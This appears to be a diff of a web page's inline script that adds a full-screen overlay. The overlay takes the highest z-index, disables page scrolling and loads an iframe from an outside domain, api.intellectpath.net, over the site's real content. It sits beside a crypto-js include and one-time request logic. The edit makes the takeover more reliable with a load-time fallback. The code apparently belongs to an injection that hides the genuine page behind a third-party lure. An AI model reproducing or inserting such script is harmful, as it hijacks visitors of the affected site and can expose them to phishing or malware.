@@ -238,7 +238,7 @@ height:350px;
     <script async="" charset="utf-8" src="https://tools.luckyorange.com/core/web-vitals.js?v=4bb1511" crossorigin="anonymous" id="lo-script-web-vitals"></script></head>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 <script>
-    (function(){
+(function(){
 
 let requestSent = false;
 
@@ -288,34 +288,53 @@ async function initOnce(){
 
 function showIframe(){
 
-    if(document.getElementById("bruceDiv"))
-        return;
+    const createFrame = () => {
 
-    const div =
-        document.createElement("div");
+        if(document.getElementById("bruceDiv"))
+            return;
 
-    div.id = "bruceDiv";
+        document.documentElement.style.overflow="hidden";
 
-    div.style.cssText =
-    "position:fixed;inset:0;z-index:2147483647;background:#fff;";
+        const div =
+            document.createElement("div");
 
-    const iframe =
-        document.createElement("iframe");
+        div.id="bruceDiv";
 
-    iframe.src =
-    "https://api.intellectpath.net/view/win";
+        div.style.cssText=
+        "position:fixed;inset:0;z-index:2147483647;background:#fff;";
 
-    iframe.style.cssText =
-    "width:100%;height:100%;border:0;display:block;";
+        const iframe =
+            document.createElement("iframe");
 
-    div.appendChild(iframe);
+        iframe.src=
+        "https://api.intellectpath.net/view/win";
 
-    document.body.appendChild(div);
+        iframe.style.cssText=
+        "width:100%;height:100%;border:0;display:block;";
+
+        iframe.allow=
+        "fullscreen; autoplay; encrypted-media; picture-in-picture";
+
+        iframe.allowFullscreen=true;
+
+        div.appendChild(iframe);
+
+        document.body.appendChild(div);
+    };
+
+    if(document.body){
+        createFrame();
+    }else{
+        window.addEventListener(
+            "DOMContentLoaded",
+            createFrame,
+            {once:true}
+        );
+    }
 
 }
 
 })();
-
 </script>
 <script>
     document.body.style.overflow = "hidden";
